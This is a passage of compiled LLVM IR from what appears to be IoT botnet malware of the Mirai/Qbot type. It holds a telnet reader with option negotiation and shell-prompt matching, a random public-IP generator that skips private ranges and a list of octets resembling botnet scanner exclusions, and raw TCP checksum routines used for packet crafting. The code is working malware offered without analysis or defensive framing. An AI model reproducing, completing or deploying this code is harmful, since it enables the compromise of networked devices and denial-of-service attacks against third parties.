  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !5
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #2
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #2
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #2
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #2
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.346, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #2
  ret i32 %180
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
